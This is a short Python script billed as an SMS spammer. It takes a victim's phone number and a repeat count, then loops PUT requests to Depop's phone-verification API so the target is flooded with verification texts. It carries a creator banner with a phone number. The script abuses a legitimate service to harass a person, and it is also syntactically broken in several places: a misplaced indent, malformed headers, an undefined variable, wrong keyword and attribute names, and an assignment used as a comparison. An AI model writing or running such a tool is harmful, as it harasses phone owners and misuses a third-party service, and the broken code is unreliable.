import requests,json,os,time
from requests import put

banner="""
/t Spam Sms
/t **********

[+] Creator : H2o
[+] Wa : +6285274745487
 Cyber Phantom
***********************
	"""
	
os.system("clear")
print(banner)
nomor=input("nomor: ")
 jumlah=int(input(" [+] Jumlah : "))
print()
headers={
"Host":" webapi.depop.com",
"content-length":" 50",
"accept":" application/json, text/plain, */*",
"user-agent":" Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
"content-type":" application/json",
"origin":" https://signup.depop.com",
"sec-fetch-site":" same-site",
"sec-fetch-mode: cors",
"sec-fetch-dest: empty",
"referer":" https://signup.depop.com/",
"accept-encoding":" gzip, deflate, br",
"accept-language":" id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
}
data={
"phone_number":Nomor,
"country_code":"ID"
}
for i in range (int(jumlah)):
    respon=requests.put("https://webapi.depop.com/api/v1/auth/verify/phone",header=headers,json=data,)
    H2o=json.loads(respon.txt)
    if H2o["is_verified"]=false:
        print("[√] spam Sms Berhasil")
        time.sleep(2)
    else:
        print("[×] spam Sms Gagal")
        time.sleep(2)
File Name to write: sms.py
     
     